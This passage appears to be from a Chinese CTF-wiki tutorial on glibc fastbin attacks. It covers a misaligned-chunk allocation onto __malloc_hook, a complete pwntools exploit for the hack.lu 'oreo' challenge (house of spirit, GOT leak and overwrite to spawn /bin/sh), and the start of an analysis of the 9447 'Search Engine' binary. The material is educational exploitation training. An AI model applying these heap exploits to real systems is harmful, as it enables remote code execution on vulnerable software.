0x7ffff7dd1ab0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ab8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ac8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ad8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae0 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1ae8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0
0x7ffff7dd1b00 0x20 0x2e 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b08 0x0  0x2a 0xa9 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1b10 &lt;__malloc_hook&gt;: 0x30    0x28    0xa9    0xf7    0xff    0x7f    0x0 0x0
</pre></div>
0x7ffff7dd1b10 是我们想要控制的 __malloc_hook 的地址，于是我们向上寻找是否可以错位出一个合法的size域。因为这个程序是 64 位的，因此 fastbin 的范围为32字节到128字节(0x20-0x80)，如下：
<div class="codehilite"><pre><span></span>//这里的size指用户区域，因此要小2倍SIZE_SZ
Fastbins[idx=0, size=0x10] 
Fastbins[idx=1, size=0x20] 
Fastbins[idx=2, size=0x30] 
Fastbins[idx=3, size=0x40] 
Fastbins[idx=4, size=0x50] 
Fastbins[idx=5, size=0x60] 
Fastbins[idx=6, size=0x70] 
</pre></div>
通过观察发现 0x7ffff7dd1af5 处可以现实错位构造出一个0x000000000000007f
<div class="codehilite"><pre><span></span>0x7ffff7dd1af0 0x60 0x2 0xdd 0xf7 0xff 0x7f 0x0 0x0
0x7ffff7dd1af8 0x0  0x0 0x0 0x0 0x0 0x0 0x0 0x0

0x7ffff7dd1af5 &lt;_IO_wide_data_0+309&gt;:   0x000000000000007f
</pre></div>
因为 0x7f 在计算 fastbin index 时，是属于 index 5 的，即 chunk 大小为 0x70 的。</p>
<div class="codehilite"><pre><span></span><span class="cp">##define fastbin_index(sz)                                                      \</span>
<span class="cp">    ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span>
</pre></div>

<p>而其大小又包含了 0x10 的 chunk_header，因此我们选择分配 0x60 的 fastbin，将其加入链表。
最后经过两次分配可以观察到 chunk 被分配到 0x00007ffff7dd1b15，因此我们就可以直接控制 __malloc_hook的内容。</p>
<div class="codehilite"><pre><span></span>0x4005a8 &lt;main+66&gt;        call   0x400450 &lt;malloc@plt&gt;
 →   0x4005ad &lt;main+71&gt;        mov    QWORD PTR [rbp-0x8], rax

 $rax   : 0x00007ffff7dd1b15 

0x7ffff7dd1b05 &lt;__memalign_hook+5&gt;: 0xfff7a92a0000007f  0x000000000000007f
0x7ffff7dd1b15 &lt;__malloc_hook+5&gt;:   0x0000000000000000  0x0000000000000000
0x7ffff7dd1b25 &lt;main_arena+5&gt;:  0x0000000000000000  0x0000000000000000
0x7ffff7dd1b35 &lt;main_arena+21&gt;: 0x0000000000000000  0x0000000000000000
</pre></div>

<h3 id="_14">小总结<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<p>Arbitrary Alloc 在 CTF 中用地更加频繁。我们可以利用字节错位等方法来绕过 size 域的检验，实现任意地址分配 chunk，最后的效果也就相当于任意地址写任意值。</p>
<h2 id="2014-hacklu-oreo">2014 hack.lu oreo<a class="headerlink" href="#2014-hacklu-oreo" title="Permanent link">&para;</a></h2>
<h3 id="_15">基本分析<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>➜  2014_Hack.lu_oreo git:<span class="o">(</span>master<span class="o">)</span> file oreo
oreo: ELF <span class="m">32</span>-bit LSB executable, Intel <span class="m">80386</span>, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.26, BuildID<span class="o">[</span>sha1<span class="o">]=</span>f591eececd05c63140b9d658578aea6c24450f8b, stripped
➜  2014_Hack.lu_oreo git:<span class="o">(</span>master<span class="o">)</span> checksec oreo         
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/house_of_spirit/2014_Hack.lu_oreo/oreo&#39;</span>
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x8048000<span class="o">)</span>
</pre></div>

<p>可以看出，程序确实是比较老的，32位程序，动态链接，就连 RELRO 技术也没有上。</p>
<h3 id="_16">基本功能<a class="headerlink" href="#_16" title="Permanent link">&para;</a></h3>
<p><strong>需要注意的是，该程序并没有进行 setvbuf 操作，因此在初次执行 io 函数时，会在堆上分配空间。</strong></p>
<p>正如程序中直接输出的信息，程序主要是一个原始的在线枪支系统。其中，根据添加枪支的过程，我们可以得到枪支的基本结构如下</p>
<div class="codehilite"><pre><span></span><span class="mo">00000000</span> <span class="n">rifle</span>           <span class="n">struc</span> <span class="p">;</span> <span class="p">(</span><span class="k">sizeof</span><span class="o">=</span><span class="mh">0x38</span><span class="p">,</span> <span class="n">mappedto_5</span><span class="p">)</span>
<span class="mo">00000000</span> <span class="n">descript</span>        <span class="n">db</span> <span class="mi">25</span> <span class="n">dup</span><span class="p">(</span><span class="o">?</span><span class="p">)</span>
<span class="mo">0000001</span><span class="mi">9</span> <span class="n">name</span>            <span class="n">db</span> <span class="mi">27</span> <span class="n">dup</span><span class="p">(</span><span class="o">?</span><span class="p">)</span>
<span class="mo">00000034</span> <span class="n">next</span>            <span class="n">dd</span> <span class="o">?</span>                    <span class="p">;</span> <span class="n">offset</span>
<span class="mo">0000003</span><span class="mi">8</span> <span class="n">rifle</span>           <span class="n">ends</span>
</pre></div>

<p>程序的基本功能如下</p>
<ul>
<li>添加枪支，其主要会读取枪支的名字与描述。但问题在于读取的名字的长度过长，可以覆盖 next 指针以及后面堆块的数据。可以覆盖后面堆块的数据大小为 56-(56-27)=27 大小。需要注意的是，这些枪支的大小都是在fastbin 范围内的。</li>
<li>展示添加枪支，即从头到尾输出枪支的描述与名字。</li>
<li>订已经选择的枪支，即将所有已经添加的枪支释放掉，但是并没有置为NULL。</li>
<li>留下订货消息</li>
<li>展示目前状态，即添加了多少只枪，订了多少单，留下了什么信息。</li>
</ul>
<p>不难分析得到，程序的漏洞主要存在于添加枪支时的堆溢出漏洞。</p>
<h3 id="_17">利用<a class="headerlink" href="#_17" title="Permanent link">&para;</a></h3>
<p>基本利用思路如下</p>
<ol>
<li>由于程序存在堆溢出漏洞，而且还可以控制 next 指针，我们可以直接控制 next 指针指向程序中 got 表的位置。当进行展示的时候，即可以输出对应的内容，这里同时需要确保假设对应地址为一个枪支结构体时，其 next 指针为 NULL。这里我采用 puts@got。通过这样的操作，我们就可以获得出 libc 基地址，以及 system 函数地址。</li>
<li>由于枪支结构体大小是 0x38 大小，所以其对应的 chunk 为 0x40。这里采用 <code>house of sprit</code> 的技术来返回 0x0804A2A8 处的chunk，即留下的消息的指针。因此，我们需要设置 0x0804A2A4 处的内容为 0x40，即需要添加 0x40 支枪支，从而绕过大小检测。同时为了确保可以绕过 next chunk 的检测，这里我们编辑留下的消息。</li>
<li>在成功分配这样的 chunk 后，我们其实就有了一个任意地址修改的漏洞，这里我们可以选择修改一个合适的 got 项为 system 地址，从而获得 shell。</li>
</ol>
<p>具体代码如下</p>
<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;gnome-terminal&#39;</span><span class="p">,</span> <span class="s1">&#39;-x&#39;</span><span class="p">,</span> <span class="s1">&#39;sh&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">]</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">]:</span>
    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
<span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="s2">&quot;./oreo&quot;</span>
<span class="n">oreo</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
<span class="k">else</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./oreo&quot;</span><span class="p">)</span>
<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;PID: &#39;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">proc</span><span class="o">.</span><span class="n">pidof</span><span class="p">(</span><span class="n">p</span><span class="p">)[</span><span class="mi">0</span><span class="p">]))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">add</span><span class="p">(</span><span class="n">descrip</span><span class="p">,</span> <span class="n">name</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&#39;Rifle name: &#39;)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">name</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&#39;Rifle description: &#39;)</span>
    <span class="c1">#sleep(0.5)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">descrip</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">show_rifle</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">order</span><span class="p">():</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;3&#39;</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">message</span><span class="p">(</span><span class="n">notice</span><span class="p">):</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;4&#39;</span><span class="p">)</span>
    <span class="c1">#p.recvuntil(&quot;Enter any notice you&#39;d like to submit with your order: &quot;)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">notice</span><span class="p">)</span>


<span class="k">def</span> <span class="nf">exp</span><span class="p">():</span>
    <span class="k">print</span> <span class="s1">&#39;step 1. leak libc base&#39;</span>
    <span class="n">name</span> <span class="o">=</span> <span class="mi">27</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">])</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">show_rifle</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;===================================</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Description: &#39;</span><span class="p">)</span>
    <span class="n">puts_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)[:</span><span class="mi">4</span><span class="p">])</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;puts addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">))</span>
    <span class="n">libc_base</span> <span class="o">=</span> <span class="n">puts_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;puts&#39;</span><span class="p">]</span>
    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
    <span class="n">binsh_addr</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>

    <span class="k">print</span> <span class="s1">&#39;step 2. free fake chunk at 0x0804A2A8&#39;</span>

    <span class="c1"># now, oifle_cnt=1, we need set it = 0x40</span>
    <span class="n">oifle</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">while</span> <span class="n">oifle</span> <span class="o">&lt;</span> <span class="mh">0x3f</span><span class="p">:</span>
        <span class="c1"># set next link=NULL</span>
        <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">))</span>
        <span class="n">oifle</span> <span class="o">+=</span> <span class="mi">1</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">27</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x0804a2a8</span><span class="p">)</span>
    <span class="c1"># set next link=0x0804A2A8, try to free a fake chunk</span>
    <span class="n">add</span><span class="p">(</span><span class="mi">25</span> <span class="o">*</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
    <span class="c1"># before free, we need to bypass some check</span>
    <span class="c1"># fake chunk&#39;s size is 0x40</span>
    <span class="c1"># 0x20 *&#39;a&#39; for padding the last fake chunk</span>
    <span class="c1"># 0x40 for fake chunk&#39;s next chunk&#39;s prev_size</span>
    <span class="c1"># 0x100 for fake chunk&#39;s next chunk&#39;s size</span>
    <span class="c1"># set fake iofle&#39; next to be NULL</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="mh">0x20</span> <span class="o">*</span> <span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x40</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x100</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">52</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">128</span><span class="p">,</span> <span class="s1">&#39;c&#39;</span><span class="p">)</span>
    <span class="n">message</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="c1"># fastbin 0x40: 0x0804A2A0-&gt;some where heap-&gt;NULL</span>
    <span class="n">order</span><span class="p">()</span>
    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;Okay order submitted!</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="k">print</span> <span class="s1">&#39;step 3. get shell&#39;</span>
    <span class="c1"># modify free@got to system addr</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">oreo</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;strlen&#39;</span><span class="p">])</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">20</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">)</span>
    <span class="n">add</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span> <span class="s1">&#39;b&#39;</span> <span class="o">*</span> <span class="mi">20</span><span class="p">)</span>
    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;system addr: &#39;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
    <span class="c1">#gdb.attach(p)</span>
    <span class="n">message</span><span class="p">(</span><span class="n">p32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">)</span> <span class="o">+</span> <span class="s1">&#39;;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>

    <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
    <span class="n">exp</span><span class="p">()</span>
</pre></div>

<p>当然，该题目也可以使用 <code>fast bin attack</code> 中的其它技术来实现，可参考参考文献中的链接。</p>
<h2 id="2015-9447-ctf-search-engine">2015 9447 CTF : Search Engine<a class="headerlink" href="#2015-9447-ctf-search-engine" title="Permanent link">&para;</a></h2>
<h3 id="_18">基本信息<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span>➜  2015_9447ctf_search-engine git:<span class="o">(</span>master<span class="o">)</span> file search
search: ELF <span class="m">64</span>-bit LSB executable, x86-64, version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="k">for</span> GNU/Linux <span class="m">2</span>.6.24, BuildID<span class="o">[</span>sha1<span class="o">]=</span>4f5b70085d957097e91f940f98c0d4cc6fb3343f, stripped
➜  2015_9447ctf_search-engine git:<span class="o">(</span>master<span class="o">)</span> checksec search   
<span class="o">[</span>*<span class="o">]</span> <span class="s1">&#39;/mnt/hgfs/Hack/ctf/ctf-wiki/pwn/heap/example/fastbin_attack/2015_9447ctf_search-engine/search&#39;</span>
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE <span class="o">(</span>0x400000<span class="o">)</span>
    FORTIFY:  Enabled
</pre></div>

<h3 id="_19">基本功能<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
<p>程序的基本功能是</p>
<ul>
<li>索引一个句子</li>
<li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
<li>读取的字符串长度必须和给定的大小相等</li>
<li>每次索引的句子都是直接在直接建立在前面的句子上的。</li>
<li>在一个句子中搜索单词</li>
<li>大小v0，(unsigned int)(v0 - 1) &gt; 0xFFFD</li>
<li>读取指定长度字符串</li>
<li>如果有回车标记<ul>
<li>在指定长度内没有遇到回车，则读完没有设置NULL标记</li>
<li>在指定长度内遇到回车，就截断返回。</li>
</ul>
</li>
<li>没有回车标记<ul>
<li>读够指定长度，没有NULL标记结尾。</li>
</ul>
</li>
</ul>
<h3 id="_20">词语结构体<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h3>
<p>通过分析索引句子的过程，我们可以得到词语的结构如下</p>
<div class="codehilite"><pre><span></span>00000000 word_struct     struc ; (sizeof=0x28, mappedto_6)
00000000 content         dq ?
00000008 size            dd ?
0000000C padding1        dd ?
00000010 sentence_ptr    dq ?                    ; offset
00000018 len             dd ?
0000001C padding2        dd ?
00000020 next            dq ?                    ; offset
00000028 word_struct     ends
</pre></div>

<h3 id="_21">堆内存相关操作<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h3>
<p>分配</p>
<ul>
<li>malloc 40 字节为一个word结构体</li>
<li>为句子或者单词 malloc 指定大小。</li>
</ul>
<p>释放</p>
<ul>
<li>释放删除的句子</li>
<li>释放删除句子所搜索的临时单词</li>
<li>释放索引句子时未使用的单词结构</li>
</ul>
<h3 id="_22">漏洞<a class="headerlink" href="#_22" title="Permanent link">&para;</a></h3>
<p><strong>索引句子读取字符串时无NULL结尾</strong></p>
<p>在索引句子时 flag_enter 永远为 0，所以读取句子时最后没有 NULL 结尾。</p>
<div class="codehilite"><pre><span></span>    <span class="n">_flag_enter</span> <span class="o">=</span> <span class="n">flag_enter</span><span class="p">;</span>
    <span class="n">v4</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="n">v5</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v4</span><span class="p">];</span>
      <span class="n">v6</span> <span class="o">=</span> <span class="n">fread</span><span class="p">(</span><span class="o">&amp;</span><span class="n">s</span><span class="p">[</span><span class="n">v4</span><span class="p">],</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">v6</span> <span class="o">&lt;=</span> <span class="mi">0</span> <span class="p">)</span>
        <span class="k">break</span><span class="p">;</span>
      <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">v5</span> <span class="o">==</span> <span class="sc">&#39;\n&#39;</span> <span class="o">&amp;&amp;</span> <span class="n">_flag_enter</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="o">*</span><span class="n">v5</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
          <span class="k">return</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="n">v4</span> <span class="o">=</span> <span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&lt;=</span> <span class="n">v6</span> <span class="o">-</span> <span class="mi">1</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span>
      <span class="p">{</span>
        <span class="n">v4</span> <span class="o">+=</span> <span class="n">v6</span><span class="p">;</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">len</span> <span class="o">&lt;=</span> <span class="n">v4</span> <span class="p">)</span>
          <span class="k">break</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">}</span>
</pre></div>

<p><strong>读取选择操作数</strong></p>
<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">read_num</span><span class="p">()</span>
<span class="p">{</span>
  <span class="kr">__int64</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
  <span class="kt">char</span> <span class="o">*</span><span class="n">endptr</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-50h]</span>
  <span class="kt">char</span> <span class="n">nptr</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-48h]</span>
  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp+48h] [rbp-10h]</span>

  <span class="n">v3</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,</span> <span class="mi">48</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
  <span class="n">result</span> <span class="o">=</span> <span class="n">strtol</span><span class="p">(</span><span class="o">&amp;</span><span class="n">nptr</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">endptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
  <span class="k">if</span> <span class="p">(</span> <span class="n">endptr</span> <span class="o">==</span> <span class="o">&amp;</span><span class="n">nptr</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;%s is not a valid number</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">nptr</span><span class="p">);</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">read_num</span><span class="p">();</span>
  <span class="p">}</span>
  <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>因为 read_str 不设置NULL ，因此，如果 nptr 读取的不合法的话，就有可能会 leak 出栈上的内容。</p>
<p><strong>索引句子释放未置NULL</strong></p>
<div class="codehilite"><pre><span></span>  <span class="k">else</span>
  <span class="p">{</span>
    <span class="n">free</span><span class="p">(</span><span class="n">v6</span><span class="p">);</span>
  <span class="p">}</span>
</pre></div>

<p><strong>搜索词语中删除词语时，对应句子指针只是释放，并没有设置为NULL</strong></p>
<div class="codehilite"><pre><span></span>  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="n">head</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span><span class="o">-&gt;</span><span class="n">next</span> <span class="p">)</span>
  <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span> <span class="p">)</span>
    <span class="p">{</span>
      <span class="k">if</span> <span class="p">(</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">size</span><span class="p">)</span> <span class="o">==</span> <span class="n">v0</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">memcmp</span><span class="p">((</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">content</span><span class="p">,</span> <span class="n">v1</span><span class="p">,</span> <span class="n">v0</span><span class="p">)</span> <span class="p">)</span>
      <span class="p">{</span>
        <span class="n">__printf_chk</span><span class="p">(</span><span class="mi">1LL</span><span class="p">,</span> <span class="s">&quot;Found %d: &quot;</span><span class="p">,</span> <span class="n">LODWORD</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">));</span>
        <span class="n">fwrite</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">SLODWORD</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">),</span> <span class="n">stdout</span><span class="p">);</span>
        <span class="n">putchar</span><span class="p">(</span><span class="sc">&#39;\n&#39;</span><span class="p">);</span>
        <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Delete this sentence (y/n)?&quot;</span><span class="p">);</span>
        <span class="n">read_str</span><span class="p">(</span><span class="o">&amp;</span><span class="n">choice</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span> <span class="n">choice</span> <span class="o">==</span> <span class="sc">&#39;y&#39;</span> <span class="p">)</span>
        <span class="p">{</span>
          <span class="n">memset</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SLODWORD</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">len</span><span class="p">));</span>
          <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="o">-&gt;</span><span class="n">sentence_ptr</span><span class="p">);</span>
          <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Deleted!&quot;</span><span class="p">);</span>
        <span class="p">}</span>
      <span class="p">}</span>
    <span class="p">}</span>
  <span class="p">}</span>
  <span class="n">free</span><span class="p">(</span><span class="n">v1</span><span class="p">);</span>
</pre></div>

